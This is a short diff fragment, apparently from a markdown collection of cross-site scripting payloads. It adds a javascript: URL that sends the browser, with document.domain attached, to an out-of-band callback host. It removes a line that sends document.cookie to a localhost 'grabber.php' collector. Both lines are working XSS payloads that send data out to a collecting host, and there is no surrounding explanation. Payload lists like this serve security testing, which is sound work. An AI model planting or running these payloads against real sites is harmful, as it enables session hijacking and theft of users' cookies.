@@ -19,10 +19,10 @@ ___
 
 
 ```js
-
+javascript:alert(document.location='http://tqppomndoggvfeiefwpdh4jb599h3e07m.oast.fun/?c='+document.domain)
 ```
 
 
 ```
-document.location='http://localhost/XSS/grabber.php?c='+document.cookie
+
 ```
